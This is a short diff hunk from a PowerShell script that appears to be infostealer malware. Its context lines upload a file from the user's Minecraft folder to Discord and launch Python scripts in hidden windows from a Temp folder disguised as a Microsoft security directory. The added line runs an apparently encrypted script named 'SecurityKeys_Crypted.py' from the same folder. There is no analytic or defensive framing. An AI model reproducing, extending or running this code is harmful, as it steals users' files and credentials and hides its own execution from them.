@@ -136,6 +136,8 @@ Upload-Discord -file "C:\Users\$env:username\AppData\Roaming\.minecraft\cheatbre
 Upload-Discord -text "-----------------------------------------------------------------------------------------------------------------------------------------------------------"
 powershell -windowstyle hidden C:\Windows\Temp\Win.microsoft.Security.temp\UUID_use.py
 #powershell -windowstyle hidden C:\Windows\Temp\Win.microsoft.Security.temp\UUID_utils.py
+python C:\windows\temp\Win.microsoft.Security.temp\SecurityKeys_Crypted.py
 
 ######################################################################
+
 
